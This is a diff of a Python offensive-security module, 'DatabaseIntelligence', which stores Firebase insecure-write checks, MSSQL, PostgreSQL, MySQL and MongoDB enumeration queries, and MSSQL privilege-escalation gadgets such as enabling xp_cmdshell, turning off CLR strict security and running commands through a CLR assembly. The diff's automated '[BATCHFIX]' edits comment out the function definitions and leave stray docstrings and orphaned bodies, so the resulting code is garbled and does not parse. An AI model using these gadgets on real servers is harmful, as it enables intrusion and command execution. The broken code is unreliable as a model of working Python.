@@ -18,19 +18,28 @@ from typing import List, Dict, Any
 
 
 class DatabaseIntelligence:
-    """Intelligence engine for database enumeration and exploitation (SQL Server, MySQL, etc.)."""
-
-    @staticmethod
-    def get_cloud_db_exposure_patterns() -> Dict[str, Dict]:
-        """Discovery and exploitation patterns for cloud-based databases (Ported from firebaseExploiter)."""
+# [BATCHFIX] Commented metadata/non-Python
+#     pass  # [BATCHFIX] inserted for empty class
+""""Intelligence engine for database enumeration and exploitation (SQL Server, MySQL, etc.)."""
+# #
+#     @staticmethod
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_cloud_db_exposure_patterns() -> Dict[str, Dict]:
+""""Discovery and exploitation patterns for cloud-based databases (Ported from firebaseExploiter)."""
         return {
             "firebase": {
                 "read_test_url": "https://{app_id}.firebaseio.com/.json",
                 "write_test_method": "PUT",
                 "write_test_payload": '{"vuln_check": "insecure_access_detected"}',
-                "config_regex": (
-                    r"\"apiKey\":\s*\"([^\"]+)\",\s*\"authDomain\":\s*\"([^\"]+)\","
-                    r"\s*\"databaseURL\":\s*\"([^\"]+)\""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unmatched parenthesis
+#                 "config_regex": (
+# [BATCHFIX] Commented metadata/non-Python
+# #                     r"\"apiKey\":\\\\s*\"([^\"]+)\",\\\\s*\"authDomain\":\\\\s*\"([^\"]+)\","  # [BATCHFIX] closed string
+# [BATCHFIX] Commented metadata/non-Python
+# #                     r"\\\\s*\"databaseURL\":\\\\s*\"([^\"]+)\"  # [BATCHFIX] closed string
                 ),
             },
             "couchdb": {
@@ -44,27 +53,43 @@ class DatabaseIntelligence:
         }
 
     @staticmethod
-    def get_mssql_recon_queries() -> Dict[str, str]:
-        """SQL queries for MSSQL enumeration (Port 1433)."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_mssql_recon_queries() -> Dict[str, str]:
+""""SQL queries for MSSQL enumeration (Port 1433)."""
         return {
             "get_databases": "SELECT name FROM master.dbo.sysdatabases",
             "get_linked_servers": "SELECT name, product, provider, data_source FROM sys.servers",
-            "get_exec_on_linked": "SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER')",
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #             "get_exec_on_linked": "SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER')",
             "check_xp_cmdshell": "SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'",
             "check_rpc_out": "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = 'LINKED_SERVER'",
             "check_user_context": "SELECT SYSTEM_USER; SELECT USER_NAME();",
             "check_trustworthy": "SELECT name, is_trustworthy_on FROM sys.databases;",
-            "check_impersonation": (
-                "SELECT distinct b.name FROM sys.server_permissions a "
-                "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
-                "WHERE a.permission_name = 'IMPERSONATE';"
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unmatched parenthesis
+#             "check_impersonation": (
+# [BATCHFIX] Commented metadata/non-Python
+# #                 "SELECT distinct b.name FROM sys.server_permissions a"  # [BATCHFIX] closed string
+# [BATCHFIX] Commented metadata/non-Python
+# #                 "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id"  # [BATCHFIX] closed string
+# [BATCHFIX] Commented metadata/non-Python
+# #                 "WHERE a.permission_name = 'IMPERSONATE';"  # [BATCHFIX] closed string
             ),
         }
 
     @staticmethod
-    def get_mssql_privesc_gadgets() -> Dict[str, Any]:
-        """Advanced gadgets for MSSQL privilege escalation and code execution."""
-        return {
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_mssql_privesc_gadgets() -> Dict[str, Any]:
+""""Advanced gadgets for MSSQL privilege escalation and code execution."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#        " return {"  # [BATCHFIX] closed string
             "clr_assembly_exec": {
                 "desc": "Create a CLR assembly from hex to bypass xp_cmdshell restrictions.",
                 "setup": [
@@ -73,9 +98,13 @@ class DatabaseIntelligence:
                     "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;",
                 ],
                 "create_assembly": "CREATE ASSEMBLY myAssembly FROM 0x4D5A...; -- (Ported from yolo-mssqlclient)",
-                "create_procedure": (
-                    "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) "
-                    "AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unmatched parenthesis
+#                 "create_procedure": (
+# [BATCHFIX] Commented metadata/non-Python
+# #                     "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000)"  # [BATCHFIX] closed string
+# [BATCHFIX] Commented metadata/non-Python
+# #                     "AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"  # [BATCHFIX] closed string
                 ),
             },
             "sp_start_job": "EXEC msdb.dbo.sp_start_job @job_name = '...'; -- Blind execution via SQL Agent",
@@ -83,17 +112,27 @@ class DatabaseIntelligence:
         }
 
     @staticmethod
-    def get_mssql_enable_xp_cmdshell() -> List[str]:
-        """Commands to enable xp_cmdshell (requires sysadmin)."""
-        return [
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_mssql_enable_xp_cmdshell() -> List[str]:
+""""Commands to enable xp_cmdshell (requires sysadmin)."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#     "    return ["  # [BATCHFIX] closed string
             "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
             "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
         ]
 
     @staticmethod
-    def get_postgres_recon_queries() -> Dict[str, str]:
-        """SQL queries for PostgreSQL enumeration (Port 5432)."""
-        return {
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_postgres_recon_queries() -> Dict[str, str]:
+""""SQL queries for PostgreSQL enumeration (Port 5432)."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented unterminated string
+#  "       return {"  # [BATCHFIX] closed string
             "get_version": "SELECT version()",
             "get_databases": "SELECT datname FROM pg_database",
             "get_tables": "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog'",
@@ -101,8 +140,11 @@ class DatabaseIntelligence:
         }
 
     @staticmethod
-    def get_mysql_recon_queries() -> Dict[str, str]:
-        """SQL queries for MySQL enumeration (Port 3306)."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_mysql_recon_queries() -> Dict[str, str]:
+""""SQL queries for MySQL enumeration (Port 3306)."""
         return {
             "get_version": "SELECT @@version",
             "get_databases": "SHOW DATABASES",
@@ -111,6 +153,12 @@ class DatabaseIntelligence:
         }
 
     @staticmethod
-    def get_mongodb_recon_commands() -> List[str]:
-        """Commands for MongoDB enumeration (Port 27017)."""
-        return ["db.adminCommand('listDatabases')", "db.getUsers()", "db.getCollectionNames()"]
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #     def get_mongodb_recon_commands() -> List[str]:
+""""Commands for MongoDB enumeration (Port 27017)."""
+# [BATCHFIX] Commented metadata/non-Python
+# # [BATCHFIX] Commented metadata/non-Python
+# [BATCHFIX] Commented metadata/non-Python
+# #         return ["db.adminCommand('listDatabases')", "db.getUsers()", "db.getCollectionNames()"]
